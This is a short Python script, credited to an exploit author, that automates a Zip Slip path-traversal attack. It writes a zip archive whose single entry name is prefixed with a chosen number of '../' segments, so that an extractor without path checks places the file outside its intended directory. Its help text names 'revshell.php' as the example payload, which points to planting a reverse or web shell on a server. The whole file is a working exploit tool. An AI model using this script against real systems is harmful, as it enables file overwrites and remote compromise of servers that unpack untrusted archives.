#!/usr/bin/python3
import argparse
import zipfile
import os

"""
Exploit Author: z3rodol
Exploit Date: August, 2025
"""

# Create the parser
parser = argparse.ArgumentParser(description='Zipslip Attack Automation Script')

# Main arguments
parser.add_argument('archive_name', help="Name of the archive to create")
parser.add_argument('file_name', help="Name of the file to include (Example revshell.php)")
parser.add_argument('levels', type=int, help="Number of levels (Exemple 2)")

# Optionnal arguments
parser.add_argument('--verbose', '-v', action='store_true', help='Verbose mode')

# Parse the arguments
args = parser.parse_args()

print(f"Archive: {args.archive_name}")
print(f"File: {args.file_name}")
print(f"Level: {args.levels}")

if args.verbose:
    print("Verbose mode activated")

# Create the path with the right number of "../"
path_prefix = "../" * args.levels
malicious_path = path_prefix + args.file_name

if args.verbose:
    print(f"Malicious path: {malicious_path}")

# Create the archive
with zipfile.ZipFile(args.archive_name, 'w') as zipf:
    # Verify if the file exists to read it's content
    if os.path.exists(args.file_name):
        with open(args.file_name, 'rb') as f:
            content = f.read()
    else:
        content = b"Test" # If the file doesn't exist
        if args.verbose:
            print(f"The file {args.file_name} is not found, using default content")
    
    # Write the file with the malicious path
    zipf.writestr(malicious_path, content)

print(f"Archive {args.archive_name} created with success")
